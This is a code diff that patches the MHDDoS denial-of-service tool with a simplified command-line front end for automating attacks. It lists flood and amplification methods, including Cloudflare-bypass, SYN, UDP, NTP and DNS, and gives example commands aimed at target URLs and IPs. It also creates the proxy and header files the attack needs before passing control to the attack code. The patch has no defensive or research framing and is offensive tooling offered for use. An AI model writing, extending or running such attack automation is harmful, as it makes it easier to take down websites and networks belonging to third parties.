@@ -1676,7 +1676,120 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     return proxies
 
 
+# === MHDDoS Simple CLI Patch (vsh00t fork) ===
+# Adds friendly argument parsing for automation
+# Usage: python3 start.py TARGET METHOD THREADS DURATION
+# Original: python3 start.py METHOD URL [proxy_type threads proxy_list rpc timer]
+
+def _simple_cli():
+    """Friendly CLI: start.py TARGET METHOD THREADS DURATION"""
+    import argparse
+    parser = argparse.ArgumentParser(
+        description='MHDDoS - Simple CLI Mode (vsh00t fork)',
+        epilog="""Examples:
+  python3 start.py https://target.com SLOW 300 600
+  python3 start.py http://1.2.3.4 STOMP 500 900
+  python3 start.py --method CFBUAM --target https://target.com --threads 200 --duration 300
+
+Methods: SLOW, STOMP, GET, POST, HTTP, HEAD, CFBUAM, CACHE, COOKIE,
+         CPS, NULL, XMLRPC, BOMB, DOWNLOADER, CONNECTION,
+         SYN, UDP, NTP, DNS, ICMP, etc.
+""")
+    parser.add_argument('target', help='Target URL or IP')
+    parser.add_argument('method', nargs='?', default='SLOW', help='Attack method (default: SLOW)')
+    parser.add_argument('threads', nargs='?', type=int, default=300, help='Thread count (default: 300)')
+    parser.add_argument('duration', nargs='?', type=int, default=300, help='Duration in seconds (default: 300)')
+    parser.add_argument('--method', dest='method_flag', help='Attack method (alt syntax)')
+    parser.add_argument('--target', dest='target_flag', help='Target URL (alt syntax)')
+    parser.add_argument('--threads', type=int, help='Thread count (alt syntax)')
+    parser.add_argument('--duration', type=int, help='Duration (alt syntax)')
+    parser.add_argument('--rpc', type=int, default=100, help='Request pre-connection count (default: 100, L7 only)')
+
+    args = parser.parse_args()
+
+    # Support both positional and named args
+    target = args.target_flag or args.target
+    method = (args.method_flag or args.method).upper()
+    threads = args.threads or args.threads
+    duration = args.duration or args.duration
+    rpc = args.rpc
+
+    # Ensure scheme
+    if not target.startswith("http://") and not target.startswith("https://"):
+        target = "http://" + target
+
+    print(f"[MHDDoS CLI] Target: {target}")
+    print(f"[MHDDoS CLI] Method: {method} | Threads: {threads} | Duration: {duration}s")
+
+    # Ensure required files exist
+    useragent_file = __dir__ / "files/useragent.txt"
+    referers_file = __dir__ / "files/referers.txt"
+    proxy_dir = __dir__ / "files/proxies"
+
+    L4_METHODS = {"SYN", "UDP", "NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP",
+                   "ARD", "ICMP", "MCPE", "GSB", "VSE", "MINECRAFT", "MCBOT",
+                   "TCP", "CPS", "CONNECTION"}
+
+    if method not in L4_METHODS:
+        proxy_dir.mkdir(parents=True, exist_ok=True)
+        for fn in ["http.txt", "socks4.txt", "socks5.txt"]:
+            p = proxy_dir / fn
+            if not p.exists():
+                p.touch()
+        if not useragent_file.exists():
+            useragent_file.write_text("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36\n")
+        if not referers_file.exists():
+            referers_file.write_text("https://www.google.com/\n")
+
+    # Check method validity
+    if method not in Methods.ALL_METHODS:
+        exit(f"Method Not Found: {method}. Available: {', '.join(sorted(Methods.ALL_METHODS))}")
+
+    # Convert to original argv format and run the main logic
+    import sys as _sys
+    if method in L4_METHODS:
+        _sys.argv = ["start.py", method, target, str(threads), str(duration)]
+    else:
+        _sys.argv = [
+            "start.py", method, target, "0",  # proxy_type=0 (HTTP)
+            str(threads), "http.txt", str(rpc), str(duration)
+        ]
+
+    print(f"[MHDDoS CLI] Internal argv: {' '.join(_sys.argv)}")
+    print()
+    # Return the new argv length so caller knows
+    return len(_sys.argv)
+
+
+def _is_simple_cli_mode():
+    """Detect if we're being called in simple CLI mode.
+    Simple: TARGET METHOD THREADS DURATION (argv[1] looks like URL/IP)
+    Original: METHOD URL ... (argv[1] is an all-caps method name)"""
+    import sys as _sys
+    if len(_sys.argv) < 4:
+        return False
+    # Check if first arg looks like a target (has dot, starts with http, or is IP)
+    first = _sys.argv[1].strip()
+    if first.startswith("http://") or first.startswith("https://"):
+        return True
+    if first.startswith("--"):
+        return True
+    # If it contains a dot and a slash, it's a URL
+    if "/" in first and "." in first:
+        return True
+    # If it looks like IP:port
+    parts = first.split(":")
+    if len(parts) == 2 and parts[0].replace(".","").isdigit():
+        return True
+    return False
+
+
 if __name__ == '__main__':
+    # Detect simple CLI mode vs original mode
+    import sys as _sys
+    if _is_simple_cli_mode():
+        _simple_cli()
+
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
             one = argv[1].upper()
